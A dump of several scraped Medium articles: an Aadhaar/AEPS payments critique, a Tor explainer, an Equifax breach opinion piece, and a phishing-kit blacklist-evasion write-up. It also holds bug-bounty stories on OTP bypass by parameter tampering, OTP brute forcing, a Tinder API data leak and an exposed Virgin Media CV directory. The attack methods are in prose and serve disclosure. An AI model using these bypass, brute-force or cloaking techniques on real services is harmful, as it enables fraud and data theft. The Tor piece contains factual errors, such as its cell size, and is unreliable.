Linking an Aadhaar to a bank account is done through a process called as “seeding” an Aadhaar number to a bank account. After receiving the Aadhaar number from the customer, the bank uploads such numbers’ into a “NPCI mapper” or a repository of Aadhaar numbers and Institution Identification Number (IIN) numbers used for the purpose of routing transactions to the destination banks. The IIN is a unique 6-digit number issued by NPCI to the participating bank. If you or anyone else seed your Aadhaar with another bank account, the NPCI mapper is overwritten with the new banks’ IIN. Money transferred to an Aadhaar number, using the Aadhaar Enabled Payment System, gets transferred to the bank account linked to the Aadhaar number at the branch recognised by the IIN.
Perhaps the worst aspect of the mapper is that it slices the business process and outsources parts. This destroys the responsibility of the payment system from any single party as was in the case of NEFT or RTGS. Neither the NPCI, the UIDAI or the banks are responsible in such money transfers. They merely provide “look-up” services. In this system, a single compromised or rogue bank branch, or the perpetuator’s ability to exploit a good one, is enough to siphon off subsidy, park black money or take bribes
A money launderer can transfer money to an account linked to an alternate IIN and then re-seed the NPCI’s mapper with the original IIN for the Aadhaar number, completely wiping out any trace of money to the alternate IIN. Like transactions of bearer shares in Panama, such money transfers becomes no different from a hawala[4] transaction between real parties who remain anonymous or benami[5].
Your Aadhaar number can be used to facilitate such benami money transfers. If these money transfers linked to your Aadhaar number are detected by investigation officers or tax authorities, you, not the real operator will be held on suspicion of economic offences.
The NPCI’s idea of Aadhaar to Aadhaar banking itself is flawed. It is surprising if the RBI has licensed this payment system under the Payment and Settlements Act.
All money is ultimately stored in bank accounts and not in the name of a person. Nowhere in the world does one transfer money to a person, you transfer it to a persons account. Money transfers to and from a bank account makes every money transfer traceable from source to destination making money laundering difficult, if not impossible.
Hawala schemes make money transfers untraceable by eliminating the bank accounts. Money transfers that, like the hawala, are based on the premise that you do not share an account number, with someone transferring money to you, are inherently flawed in auditability as they wipe out the money trail.
The idea of a mapper, as used by NPCI’s AEPS, does not allow for instructions from sender but relies on periodic update of IIN in the NPCI’s table mapping Aadhaar numbers from banks. As multiple banks have to upload the Aadhaar numbers seeded with accounts held by them, this cannot guarantee desired results.
The replacement of a time tested standard of electronic money transfers under government regulation by a non-standard payment system run by a non-government company raises serious questions of national and public interest, propriety and possible conflicts of interest
Perhaps the worst aspect of the mapper is that it slices the business process and outsources parts. This destroys the responsibility of the payment system from any single party as was in the case of NEFT or RTGS. Neither the NPCI, the UIDAI or the banks are responsible in such money transfers. They merely provide “look-up” services. In this system, a single compromised or rogue bank branch, or the perpetuator’s ability to exploit a good one, is enough to siphon off subsidy, park black money or take bribes.
Such money transfers would be difficult, if not impossible, to trace without a whistleblower. A few cases have been reported that suggest the large scale play of this scenario already. For example more than 40,000 erroneous transfers were reported through AEPS in DBT transfers meant as part of drought relief for farmers in Karnataka. The government allegedly blamed the banks for failure to seed the correct Aadhaar numbers with the beneficiaries.
Governments across India had been using the RBI’s own payment system, the NEFT or RTGS, to undertake electronic money transfers. This is also evidenced by the fact that Aadhaar Leaks has exposed that bank details are already present in every record of the leaked data. There is absolutely no reason to switch public payments from NEFT to AEPS, run by a non-government company.
The replacement of a time tested standard of electronic money transfers under government regulation by a non-standard payment system run by a non-government company raises several serious questions of national and public interest, propriety and possible conflicts of interest.
Preventing disaster
If the government and the Supreme Court implement the wisdom of 7 orders of the Supreme Court of India on the use of Aadhaar, they can yet save the country from disaster resulting from the colonisation of India by the new East India Companies or the private interests driving Aadhaar.
In its first order of September 23, 2011 the Supreme Court had indicated that “no person should suffer for not getting the Aadhaar card inspite of the fact that some authority had issued a circular making it mandatory and when any person applies to get the Aadhaar Card voluntarily”.
On August 11, 2015, the 3 member bench restricted the use of Aadhaar and indicated that it may not be used for any other purpose.
On October 15, 2015, a 5 member bench led by the Chief Justice had emphasised that “the Aadhaar card Scheme is purely voluntary and it cannot be made mandatory till the matter is finally decided by this Court”. It had restricted the voluntary use of Aadhaar to public distribution system (PDS) Scheme, the liquefied petroleum gas (LPG) distribution scheme, the Mahatma Gandhi National Rural Employment Guarantee Scheme (MGNREGS), National Social Assistance Programme (Old Age Pensions, Widow Pensions, Disability Pensions), Prime Minister’s Jan Dhan Yojana (PMJDY) and Employees’ Provident Fund Organisation (EPFO).
If the government and the Supreme Court implement the wisdom of 7 orders of the Supreme Court of India on the use of Aadhaar, they can yet save the country from disaster
In the meantime, following Mahatma Gandhi’s footsteps and refusing to link Aadhaar to anything may be the only option left for you.
[1] Aadhaar is a 12 digit random number assigned by India’s Unique Identification Authority of India to unaudited and unverified demographic and biometric information submitted by private enrollers.
[2] Accounts and transactions undertaken using a ghost or a duplicate identity are called benami.
[3] Permanent Account Number or PAN is a number used to track financial transactions and file income tax returns in India.
[4] Hawala is an alternative or parallel remittance system that works outside formal banking systems.
[5] This was first highlighted in September 2014 in http://www.moneylife.in/article/how-aadhaar-linkage-can-destroy-banks/38736.html
Written by
","['Banking', 'Money Laundering', 'Aadhaar', 'Cybersecurity', 'Digital']"
How does Tor *really* work? - HackerNoon.com - Medium,https://medium.com/hackernoon/how-does-tor-really-work-c3242844e11f?source=tag_archive---------8-----------------------,"I read the whitepaper so you don’t have to.
The Onion Routing Protocol (TOR) was designed by the US Navy in the mid 1990s at the U.S Naval Research Labatory[0].
The pre-alpha version of Tor was released to the public in September of 2002 [1] and the Tor project, the company that maintains Tor, was started in 2006.
Here is a quote from the paper titled “Tor: The Second-Generation Onion Router” on what Tor is in a nutshell:
Tor is a circuit based low-latency anonymous communication service [2]
The core principle of Tor is “onion routing” which is a technique for anonymous communication over a public network. In onion routing messages are encapsulated in several layers of encryption, analogous to encapsulation in the OSI 7 layer model [3]. It is called onion routing because onions have layers and this networking protocol also has layers.
The resulting ‘onion’ (fully encapsulated message) is then transmitted through a series of nodes in a network (called onion routers) with each node peeling away a layer of the ‘onion’ and therefore uncovering the data’s next destination. When the final layer is decrypted you get the plaintext of the original message.
The original author remains anonymous because each node in the network is only aware of the preceding and following nodes in the path (except the first node that does know who the sender is, but doesn’t know the final destination).
This has led to ‘attacks’ on which the NSA runs servers in order to attempt to be the first and last nodes in the network. If the NSA server is the first node, it knows where the message is from. If the NSA server is the last node, it knows the final destination and what the message says. [4]
Onion Routing is a distributed overlay network designed to anonymise TCP-based applications like web browsing, secure shell and instant messaging.
Clients choose a path through the network and build a circuit where each onion router in the paths knows the predecessor and the successor, but no other nodes in the circuit.
Packets flows down the network in fixed-size cells which are unwrapped by a symmetric key at each node and relayed downstream.
The notion of a symmetric key comes from Symmetric-Key Encryption Algorithms.
In Symmetric Key Encryption the same key is used for both Alice (sender) and Bob (receiver) as opposed to public key encryption where these keys differ. This makes it faster and easier to use than Public Key encryption, but this also causes two problems:
If a third party figures out the key, either by attacking the transfer of the key or some other method they will be able to decrypt all communications encrypted with this key.
Symmetric Key encryption is also much less computationally expensive than public key encryption, which is useful in a network like this.
Public Key Cryptography is a set of cryptographic protocols based on algorithms that require two separate keys:
These two keys are mathematically linked. In public key cryptography the use of the public key is to encrypt plaintext and the use of the private key is to decrypt encrypted text. This means that anyone can encrypt plaintext for a specific person but only that person can decrypt it.
The two keys are very large prime numbers. Assume q and p are two separate and equally large prime numbers and then n = pq. n is used to encrypt the message and p and q are used to decrypt the message.
This works because factorisation is hard to compute. Given a very (very) large number, find the factors of that number which are prime numbers.
Often times the numbers are in hexadecimal.
Another useful tool of cryptography to know is digital signatures.
Digital Signatures use public-key cryptography. A digital signature is a digital version of a physical signature. Often times you can say you have cryptographically / digitally signed a document. Only the person with the private key can produce valid digital signatures which allow them to sign a document alot more securely than a physical written signature.
Alice wants to digitally sign a message, m. In order to do that Alice must have:
Alice then uses a signing function to produce a digital signature:
The exact internals of the signing function isn’t necessary to know. The function takes a message, a private key and it will produce a digital signature.
Anyone can use the public key to verify a digital signature:
I say that a signing function isn’t necessary to know however if you want to learn a few go ahead. The reason I haven’t added them to this document is because someone from 2–3 years time might read this and signing functions could be completely different.
Tor requires alot of users to create anonmity and thus if Tor was hard to use users wouldn’t adopt it so easily making it less anonymous. Because of this, the usabillity isn’t just a design choice of Tor but a security requirement. If Tor isn’t usable or designed nicely, it won’t be used and thus it won’t be secured.
Tor has therefore had to make some design decisions that may not improve security but improve usabillity.
Tor is not a completely decentralised peer-to-peer system like many people believe it to be. If it was completely peer to peer it wouldn’t be very usable. Tor requires a set of directory servers that manage and keep the state of the network at any given time.
Tor is not secure against end to end attacks. An end to end attack is where an entity has control of both the first and last node in a path, as stated earlier. This is a problem that cyber security experts have yet to solve, so Tor does not have a solution to this problem.
Tor does not provide protocol-normalisation like Privoxy or the Anonymizer, meaning that If senders want anonymity from responders while using complex and variable protocols like HTTP, Tor must be layered with a ﬁltering proxy such as Privoxy to hide differences between clients, and expunge protocol features that leak identity. [2]
Tor does not hide the identity of the sender.
In 2013 during the Final Exams period at Harvard a student tried to delay the exam by sending in a fake bomb threat. The student used Tor and Guerillar Mail (a service which allows people to make disposable email addresses) to send the bomb threat to school officials. [5]
The student was caught, even though he took precautions to make sure he wasn’t caught.
Gurillar mail sends an originating IP address header along with the email that’s sent so the receiver knows where the original email came from. With Tor, the student expected the IP address to be scrambled but the authorities knew it came from a Tor exit node (Tor keeps a list of all nodes in the directory service) so the authoriies simply looked for people who were accessing Tor at the time the email was sent.
So given the network above we are going to simulate a very basic onion routing protocol. The laptop on the left is the sender and the server rack on the right is the receiver.
So we start off by encrypting a message with 3 layers of encryption (Tor typically uses 3 nodes, so therefore 3 layers of encryption are needed)
The first layer is stripped off on the first machine. Something important to note here is that every machine only knows what the predecessor is or what the sucessor is, it does not know what the final goal is unless it is the last node in the path.
As it travels down the path, more and more layers are stripped away. The second (middle) node does not know where the message originated or where the final destination is.
The final node knows what the message is and where it’s going, but it doesn’t know who sent it.
The computer then reads the content of the message which might be “connect me to Facebook” and it then connects to Facebook and receives a message back as a response. Because the node doesn’t know where the original message came from, it sends it back through the network to the predecessor and says “pass this back through the network”.
But before doing this, it adds it’s own level of encryption back.
Eventually the original node receives a fully encrypted packet containing the response from Facebook. Because the original node has both private and public keys it can fully decrypt the message.
One of the key properties here is that once a node decrypts a layer, it cannot tell how many more layers there are to decrypt. It could be as small as 1 or 2 or as large as 200 layers of encryption.
The first node knows who sent the message but it doesn’t know what the message says because it is encrypted. The last node knows what the message says but it can’t tell where it came from.
Each machine, when it wants to create a circuit, chooses the exit node first, followed by the other nodes in the circuit. All paths in the circuit obey these rules:
Something important to note here is that Tor uses the Diffie-Hellman algorithm to set up session keys between the user and onion routers.
Diffie-Hellman is a way of generating a shared secret between two people in such a way that the secret can’t be seen by observing the communication. You’re not sharing information during the key exchange, you’re creating a key together.
Now for some basic knowledge on Diffie-Hellman, taken from here
I come up with two prime numbers, x and y and tell you what they are
You then pick a secret number (a) but don’t tell anyone. Instead you compute and send that result back to me (we’ll call it A)
I do the same thing, but we’ll call my secret number b and the computed number B. So I compute and send you the result.
Now you take the number I sent you and do the exact same operation with it. So that’s .
I do the same operation with the result you sent me,
The cool part here is that the answer I get at step 5 is the same answer you get at step 4. It comes down to a cool property of modulo components:
In a traditional network you have a definite input and a definite output. You know where your data is going. In a Tor Hidden Service you input some data but no outside force can see where it’s going. It is possible to communicate with a server without the user or the server knowing who eachother are.
When a server is set up on Tor to act as a hidden service, the server sends a message to some selected Onion Routers asking if they want to be an introduction point to the server. It is entirely up to the server as to who gets chosen as an introduction point and it doesn’t matter who is chosen.
The introduction points know that they are going to be introducing people to the server.
The server will then create something called a hidden service descriptor which has a public key and the IP address of each introduction point. It will then send this hidden service descriptor to a distributed hash table which means that every onion router will hold some part of the information of the hidden service descriptor.
If you try to look up a hidden service the introduction point responsible for it will give you the full hidden service descriptor.
The key for this hash table is the onion address and the onion address is derived from the server.
The idea is that the onion address isn’t publicised over the whole Tor network but instead you find it another way like from a friend telling you or on the internet (addresses ending in .onion).
So almost every single onion router will have minimal knowledge about the hidden service unless they explicitly want to find it.
If you want to access an onion address you would first request the descriptor off of the hash table and the descriptor has, let’s say 4 or 5 IP addresses of introductory nodes. You pick one at random and you’re going to ask the introduction point to introduce you to the server and instead of making a connection directly to the server you make a rendezvous point at random in the network from a given set of Onion Routers. You then make a circuit to that rendezvous point and you send a message to the rendezvous point asking if it can introduce you to the server using the introduction point you just used and then it says “I want you to send a message, X, to the server”.
The rendezvous point makes a circuit to the introduction point and sends it the word X and its IP address. The introduction point sends the message to the server and the server can choose to accept it or do nothing.
If the server accepts the message it will then create a circuit to the rendezvous point. The server sends the rendezvous point to the server and the rendezvous point looks at both messages and if they’re the same then it will then act as another hop on the circuit and connect them directly.
Another important thing to note is that every single Tor packet (called a cell) is exactly 512kb and they are all encrypted. Tor does this so people cannot guess that larger cells are images / media.
In short, a hidden service works like this, taken from here:
[0] — http://www.onion-router.net/Publications/JSAC-1998.pdf  [1] — http://archives.seul.org/or/dev/Sep-2002/msg00019.html  [2] — http://fermatslibrary.com/s/tor-the-second-generation-onion-router  [3] — http://ieeexplore.ieee.org/abstract/document/1094702/  [4] — https://cyber-peace.org/wp-content/uploads/2013/06/Attacking-Tor_-how-the-NSA-targets-users-online-anonymity-_-World-news-_-theguardian.pdf  [5] — http://www.thecrimson.com/article/2013/12/17/student-charged-bomb-threat/  [6] — https://www.youtube.com/watch?v=QRYzre4bf7I
Written by
","['About', 'Help', 'Go Home', 'Security', 'Tor', 'Research', 'Cybersecurity', 'Hacking']"
"How Equifax, Fire Eye & The Darknet Threw Oil On The Breach Fire",https://medium.com/secjuice/a-series-of-unfortunate-events-or-how-equifax-fire-eye-threw-oil-on-the-fire-c19285f866ed?source=tag_archive---------8-----------------------,"As far as data breaches go, this one stinks of lies and extortion, happily I don’t need to tell you what happened, others do that better than I can.
*Disclaimer : This is an opinion piece.
I am not going to write about the inherent flaws with tying your entire financial identity to a social security number that we cannot protect, or even try to raise your eyebrows about the unprecedented size of the breach.
You are not here to read about how Equifax completely bungled their public response, despite having more than two months to properly prepare for it.
You are probably not here to read about how Equifax have a long history of bad cybersecurity practice and failing to fix reported vulnerabilities.
Who Is On Fire?
You came to find out who poured oil on the fire, you came to find out who is going to get burned and who will be sacrificed for the greater good.
I don't blame you, it's the only angle in this story that really interested me too, if only because we have all seen this movie so many times before.
What we have not seen before though is the lies and extortion surrounding this story that are acting as a catalyst to make this story burn brighter.
Lets start with our first red flag.
You Are Their Product, Not Their Priority
Lets ignore the fact that Equifax knew that they had an obligation to notify those affected in a timely manner if their personal details were exposed.
Equifax first discovered the breach in late May or early July, but waited more than two months to notify their customers, the site they are using to notify others about the breach (equifaxsecurity2017.com) was first registered in August, but the contents of the site were not uploaded until September.
There were very clearly in no rush at all to notify the worst affected.
When follow Equifax’s advice to sign up to their (free for 12 months) credit monitoring service in order to protect yourself from the consequences of the breach, you are unknowingly signing away your right to sue them because of the deeply unethical arbitration clause they snook into the TOS.
After the outrage, it looks like they snook in an opt out too.
I actually think this whole new website is nothing more than an attempt to get as many of their ‘customers’ to waive their rights to sue, it doesn't really appear to do anything else even when you make up names and numbers.
Even worse than this, they seem to be actively trying to profit from the fear caused by the data breach to get people who have been affected to sign up to their Credit Lock service or by charging them upto $20 for a credit freeze.
If you add all of this up, it becomes pretty clear that the hundreds of millions of people affected by the data breach are not their customers (you are their product) or their immediate priority/concern in any way.
Lies And Insider Trading?
Three very senior executives at Equifax, their (ex?) Chief Financial Officer John Gamble, their President of Information Systems Joseph Loughran and a Divisional President Rodolfo Ploder all sold millions worth of shares in a sale that wasn’t agreed with the SEC, just before the notification came.
Where before all three had Linkedin profiles, now they no longer exist and to make matters worse, all three are saying they had no idea about the breach before they sold their shares, despite being so high ranking.
I have no idea why they think deleting their profile helps, its cached anyway and just makes them all look so much more guilty, like they are hiding.
Personally I hope the new investigation into their insider trading will send them all to jail (if they are guilty) for at least a short time, if only because somebody has to be burned at the stake for this whole heap of mess.
My money is on President of Information Systems Joseph Loughran.
My theory is that a whole lot of worms are going to come out of this can and these guys knew it, cashing out their shares while the going was still good.
It’s a bold move, lets see how it plays out for them.
What Are Fire Eye & Team Mandiant Up To?
The internet spotted Brandan Schondorfer, an employee of Fire Eye publicly registering Equihax.com before the official notification went out.
Brandan is on Team Mandiant, who are ‘owned and operated’ by Fire Eye and who were brought in by Equifax to investigate the breach.
Being that these guys were the cybersecurity team who were supposed to be investigating the breach and that they are owned by Fire Eye who were supposed to be protecting Equifax, this domain registration makes sense.
We feel that Brandan was just performing a rearguard action, buying up all the domains that others may use to mock Equifax for the breach, he isn’t on fire, but he was sloppy and is probably being mocked at work by his peers.
But is that all Mandiant and Fire Eye are doing though? Who knows.
The Extortion Of Equifax
We have no real idea of who the culprits behind this attack are, suspiciously more than two months after the attack and the same day of the public notification, the stolen data was put up for sale on the darknet.
What is very curious is that the people behind it seem to want to hand the data back to Equifax in return for 600 bitcoins (approx. $3 Million).
They say they are responding only to emails from Equifax employees and their stated reason for doing so is because of the Equifax executives who sold $3 million dollars worth of shares using insider trading.
If they don't get paid, they say they will publish the whole database at that domain by September the 15th, but thats unlikely to happen in my view.
This darknet site raises a whole lot of questions though, why did they not sell the data sooner and why have we not seen the data appear for sale on the darknet markets, why do they only want to speak with Equifax?
There is something deeply fishy about this whole thing, why are the perpetrators only willing to provide samples of the data they hold to Equifax employees and nobody else? Why not just sell the data on the open market?
I think this smells like a classic psyops campaign, but under whose control?
Some say it’s a hoax, but that's just speculation really.
The timing is too coincidental and this is not how criminal darknet operators with the skills to exfiltrate that data would monetize their haul, the whole thing stinks of somebody teaching somebody else a lesson because they can.
We have not even started the state vs non state conversation yet.
*** UPDATE : If this story interests you, check out my follow up story.
Sponsor | Looking for a remote browser isolation solution? Check out WEBGAP, home of WEBGAP browser isolation and the WEBGAP remote browsing service.
Written by
","['Opinion', 'OSINT', 'How To', 'Cybersecurity', 'Tech', 'Technology', 'Opinion', 'Infosec']"
How Hackers Evade Malware and Anti-Phishing Blacklists,https://medium.com/@apozy/how-hackers-evade-malware-and-anti-phishing-blacklists-4fee6d91fcd9?source=tag_archive---------7-----------------------,"By Erhan on April 24, 2017
Every morning for the last few weeks, I’ve been sending out this email to a list of victims in a carding scam we discovered targeting WhatsApp users in the UK thanks to people using our NoHack chrome extension.
Despite our efforts to get the site blacklisted in various sources like Google’s Safe Browsing and PhishTank, it remained online for months. Each day had at least 3 new victims.
This kind of scam is nothing new, but what makes this scam so interesting is how it managed to stay online with very little effort, or sophistication.
It’s unsophisticated because this is how simple the attack is:
1) The attacker sends out an SMS or email similar to this:
2) The victim enters personal information like credit card details, date of birth and security answers.
3) The scammer receives an email with all the info that looks like this:
This site was online from September 2016 to April 2017 until we finally got the hosting provider to ban it. It took them several weeks while the site actively evaded blacklists.
While the site was online, we were able to determine the following attack statistics:
Visitors by Operating System
Windows: 3399, iPhone: 1959, Android: 1506, OSX: 1029, iPad: 114, Other: 367
If we assume each victim loss is about $250.00 that’s a loss of at least $175,000. That’s crazy considering the scam was probably done automatically with a press of a button.
In fact, I know the scammer was lazy because I was able to get the above statistics from the site’s homepage:
What you are looking at is the code for this scammers’s site including snippets of the victim information accidentally left out in the open for everyone to see. The file mobile.zip hilariously contained the attack code, which I was able to use to see more exposed data and resources.
The code was in PHP and was rather simple, it featured:
Pretty neat stuff, but the secret sauce that allowed it to stay online for so long was it’s anti-blacklisting functionality. This feature had three main components:
Yup, that means anti-phishing and malware blacklists are not nearly as effective as we think they are. When a security service scans the internet and finds a malware or phishing site, it can’t differentiate between a real attack site and a fake attack site.
Hackers lure security services into fake attack sites to build a security service blacklist. When a real attack site encounters a blacklisted security service, it shows a completely different page, allowing it to fly under the radar. Basically, a blacklist to blacklist the blacklisters.
Here’s the blacklisted services from this scam:
Some interesting tidbits. TOR exit nodes are blocked and Noisebridge and CCC (popular hackerspaces) are blocked too.
Additionally, the scammer can use a whitelist strategy to block everything except users of certain internet service providers. For example, Vodaphone users in the UK.
So why are we able to discover and stop this attack where other tech giants have failed?
We are able to accurately assess malware and phishing behaviors from only a few tracked samples provided by our small community of NoHack users via One-Shot Learning. We don’t rely on blacklists and we don’t have to scan the web.
For now, I want to thank our small community of users who saved numerous individuals from credit card fraud. Here are some of the Thank You replies I received.
Still not blacklisted, but it’s finally offline.
…unless that’s a fake page and I’ve been blacklisted too ;)
https://blog.apozy.com/how-hackers-evade-malware-and-anti-phishing-blacklists/
Written by
","['Startup', 'Security', 'Cybersecurity', 'Phishing']"
How I bypassed State Bank of India OTP. - HackerNoon.com - Medium,https://medium.com/hackernoon/how-i-bypassed-state-bank-of-india-otp-f145469a9f1d?source=tag_archive---------2-----------------------,"Now a days One Time Password (OTP) are most popular Out-of-band feature of most of the banks through which a user make transaction and verify its identity using OTP sent to mobile registered with bank at the time of opening an account in the bank.
But what if we can bypass the OTP? Yes you are thinking right, here i am writing about my experience with a bank of which i was able to bypass OTP and make the transaction with any amount.
One of the most popular bank in India, State Bank of India (SBI),
Here we go:
When we make transaction at last stage we were sent to One Time Password Screen.
Approximately 3 months ago, i was searching for bug in State Bank of India, after spending 1 hr on https://retail.onlinesbi.com, i found that when i am making transaction{on last stage of transaction} there is the parameter passing in POST request called
smartotpflag is set to Y i.e. smartotpflag=Y
Initially it was already set to value Y
Here we can easily understand that smartotpflag parameter is used to generate OTP, and Y represent yes generate the OTP and send it to my mobile.
But what if we change this Y to N.
Yes, exactly i have done is changed the value from Y to N, and the result was shocking to me.
the transaction have been successfully completed without entering the OTP.
Here is the Proof of concept video:
This video shows the transaction of lesser amount but later when i tried to make the transaction of Rs.60,000 it got succeeded without entering OTP.
Even news papers are not supporting me to making aware of it to whole India.
Timeline:
19th-Oct-2016
Thanks Regards Neeraj Edwards
Hacker Noon is how hackers start their afternoons. We’re a part of the @AMI family. We are now accepting submissions and happy to discuss advertising & sponsorship opportunities.
If you enjoyed this story, we recommend reading our latest tech stories and trending tech stories. Until next time, don’t take the realities of the world for granted!
Written by
","['About', 'Help', 'Go Home', 'Cybersecurity', 'Security', 'Bug Bounty', 'Demonetization', 'Politics']"
How I bypassed the OTP verification process? Part — 1,https://medium.com/bugbountywriteup/how-i-bypassed-the-otp-verification-process-part-1-e5b333274ae9?source=tag_archive---------3-----------------------,"It’s been so long since I posted any article, partially because I was tired and taking a pleasant summer break. I was reading this particular article
How I could have booked movie tickets through other user accounts by Bharathvaj Ganesan
After reading this I realised that I have had always tried different ways to try and bypass the login credentials but never those which had OTP verification process. So this article gave a me this feel that online profiles which have inbuilt OTP verification process is not super secure as well and from there onward I tried to carry out some attack on a website that uses OTP verification process.
I started my attack on this website let’s say example.com, here I carried out my attack in two phase.
So to understand how to create a profile and how the system of OTP works on that particular website I went ahead and created my account. While I was doing that I took notice as to how the website worked?. Once done then I carried it out again for the another number that I own but this time the whole Idea was to create the account without having to touch my phone in anyway in which the sim was inserted.
So, here is how I began doing the hack. I inserted all the details as it should be. Now as I was done with it, I received an OTP on my phone instantly to verify and complete the process of a creating the account.
I was presented with this and had to put in the OTP that I had just received on my mobile. I turned intercept mode on, and captured the packet which was being sent over as a request packet to the server.
I already knew the OTP is a 6 digit number, as I received so when I made my first account.
So, I passed over the packet to the intruder tab to carry out a brute force attack and see if the website allowed multiple attempts for the OTP. Now, to figure it out I carried out a brute force attack, for the first attempt I saw the OTP that I got and made a long list of nearly 150 number and included it at the very end to just know if the process will work out or not.
I guess I was in luck when the brute attack worked. Burp Suite was able to detect which one was the correct OTP.
This is one of the biggest mistakes that i have encountered in my time while carrying out pen-testing, where we never check the number of times the OTP is entered, or the number of times passwords are entered etc.
Prevention method for such brute force attacks could be a check that disallows any attempt made more than 3–5 times, or the OTP should not be valid further after 5 wrong attempts or so. This kind of security technique can be implemented and it will help curb a huge number of security issues.
If you enjoyed it please do clap & let’s collaborate. Get, Set, Hack!
Website : aditya12anand.com | Donate : paypal.me/aditya12anand
Telegram : https://t.me/aditya12anand
Twitter : twitter.com/aditya12anand
LinkedIn : linkedin.com/in/aditya12anand/
E-mail : aditya12anand@protonmail.com
P.S. The attack where I was able to login into any user account will be discussed in another article, How I bypassed the OTP verification process? Part — 2.
Written by
","['Archive', 'ABOUT US', 'Bug Bounty', 'CTF', 'Discord Server', 'Interviews', 'Discord Group', 'Security', 'Otp', 'Brute Force', 'Hacking', 'Cybersecurity']"
How I Could Get The Instagram Username of Anyone on Tinder,https://medium.com/bugbountywriteup/wrong-swipe-tinder-29fe1eb0203c?source=tag_archive---------6-----------------------,"Note: The following article was published on 16/07/2019 on https://FogMarks.com
Today’s case-study does not involve any vulnerability at all.Yes — you heard me. No XSSes, no open redirects, no CSRFs or IDORs. Nothing. Nada.
We’ll only learn about a wrong implementation that was used by Tinder in order to integrate their users Instagram accounts on their platform.
While joking with (Ok, more like on) a friend about that the only way he’ll get a match on Tinder is if he’ll find a vulnerability for it, I have started to read about recent security vulnerabilities Tinder has suffered.So AppSecure has found a way to take over Tinder accounts using Facebook’s Account Kit, which is awesome, and Checkmarx has found that some information on Tinder is being transferred over HTTP, again, god-knows-why.But the vulnerability I have found most funny and interesting was the one discovered by IncludeSecurity about how Tinder users location was disclosed using Triangulation.A fascinating article about a creative way to disclose users location using a very-accurate location parameter that was returned to any regular request to their server. Basically, Tinder handed over a vulnerability for free.
After reading IncludeSecurity’s article I was amazed by how simple that was. No IDOR was needed, no complex CSRF or an XSS. The information was right there, for free, for everyone to take and abuse.
I’ve spent a few hours researching Tinder’s website and Android app.Really, on 2019 and especially after Facebook’s Cambridge Analytica crisis, Tinder did some damn good job securing themselves from the typical, OWASP TOP 10 vulnerabilities.
This is also the place and the time to say that on paid platforms, it is really difficult to conduct a quality security research. A lot of the actions on Tinder requires a premium account, and repeating those actions as a premium user costs even more.Companies who want their platforms to be researched by the security community should allow full access to their platform, for free.I know that a lot of security companies can afford funding the research, but it is not fair for small and individual young security researchers. Think about it.
During those few research hours I have devoted that evening after joking with (OK- on) my friend, I could not find any interesting lead to a vulnerability on Tinder. I was (and I am) so flooded in work, and I couldn’t devote anymore time for researching Tinder.I had to message my friend that he will have to get himself that auto-swiper from AliExpress in hope for a match.
And then IncludeSecurity’s article has popped in my head. I thought to myself: “If Tinder’s logic on that case was not very privacy-oriented, what other sensitive information do they pass ‘out in the wild’, while it should have been kept private?”
Tinder, like many other social platforms, has several integrations with some very popular companies and platforms — Spotify, Facebook and even with some universities.
While simply going through all the responses that came back from regular Android API calls of the application, I have noticed that when a user connects his Instagram account with Tinder, his Instagram photos are being showed on his profile page.
After tapping the ‘Share X’s Profile’ button, I’ve noticed that a unique share-identifier has been generated to that profile, which looked like this:https://go.tinder.com/~<UNIQUE_SHARE_ID>-<USER_FIRST_NAME>
When I have accessed this URL from the web version of Tinder, nothing happend — I was redirected to https://tinder.com
But when I have accessed it from an Android phone’s browser, the Tinder app was launched and a GET request to https://api.gotinder.com/user/share/~<UNIQUE_SHARE_ID> was initiated.The response to that request contained a lot of details about the user, including his/her Instagram username.
It is the first time in the history of my case-studies that I don’t have something smart to say or teach. This vulnerability (which has been patched, of course) and the one IncludeSecurity found could have been easily prevented by simply going through the returned data of all the supported API calls, and making sure that non-private information is being handed over.
In the end, I believe that a QA team has gone through the returned data of the API calls, but for the wrong purposes — they probably just made sure that the returned data is exactly what the front-end UI expects.
I think that the most important lesson here is that the QA stage before version releases is not enough, as large and comprehensive it may be.Having a Red-team is crucial for the safety of the about-to-be-released product and its users.
Cheers!
Written by
","['Archive', 'ABOUT US', 'Bug Bounty', 'CTF', 'Discord Server', 'Interviews', 'Discord Group', 'Tinder', 'Cybersecurity', 'Bug Bounty', 'Security', 'Web Development']"
How I found a vulnerability at Virgin - Alikhan Uzakov - Medium,https://medium.com/@uzakov/how-i-found-a-vulnerability-at-virgin-77041245cea5?source=tag_archive---------7-----------------------,"I am currently applying for jobs. Whilst I was filling out an application form for Virgin Media, I was offered the option to see my uploaded CV. What happened was quite surprising, the URL revealed a directory (folder) where my CV was stored. When I opened the directory I was able to see all past and present applications. This was a broken access control. In layman terms this means that access to certain data was allowed without authorisation. Think of this as if you want to withdraw money and the bank gives you money without any validation who you are, or if you have a debit card on you.
About 30,000–50,000 applications, past and present, were accessible. Personal information including telephone numbers, emails, where someone lives, and other details were out there in the open: my personal information was exposed as well. All this made me very concerned since what was happening violated the Data Protection Act 1998. As soon as I found that there was a vulnerability I reported it to Virgin Media via Twitter. I didn’t get a reply despite the Virgin Media account being relatively active and tweeting other people. They responded once I gave a call to the central office in London Hammersmith about 24 hours after initial contact.
After speaking to a security engineer on a Friday at 21:00, I walked him through step-by-step and explained to him what the problem was and how to solve it.
Virgin resolved it, but unfortunately despite talks of some sort of recognition for my work, I was informed the following Monday I would not receive a reward nor public recognition. Virgin told me: “ Virgin will not comment on this”, “At the moment there is no programme to reward people for finding vulnerabilities”, “We can’t give you a preference over other candidates since it’s unfair”. They did however said thank me a number of times on the phone and via emails.
The problem is patched now but had I been someone with malicious intentions, I could have done a lot more and might not have reported it at all. Maybe we should try to promote a more open approach where people are being rewarded for good actions and public recognition through open media rather than trying to hide the fact that sometimes we all make mistakes.
EDIT 1 ( 23rd of October 07.38)
Just wanted to clarify the vulnerability has been patched(a while ago) and I am writing this afterwards. Also I did receive a thank you from them number of times on a phone and by email.
Virgin Media were told by me long beforehand that I would like to write a blog post. I was told there will be no comment issued from them.
The goal of this post is to promote more openness and try to suggest to companies should look into their security and maybe reward anyone who finds something wrong and reports it. Vulnerabilities should not be publicly disclosed until patched and spoken about publicly disclosing them.
The post was not made to promote against Virgin Media. I applied there, why would I apply for a job at a company if I didn't want to work there? I respect Virgin Media and I still have their VR glasses given to me at job fair :)
EDIT 2 (23rd of October 19.30)
Also someone posted a link to my article, which hit 265 upvotes on r/tech
https://www.reddit.com/r/tech/comments/58vt6x/vulnerability_in_virgin_media_website_exposed/
EDIT 3 (24th of October 21.59)
Just hit 5k wow
Also IB Times wrote an article about this story:
EDIT 4 (1st of November 14.17)
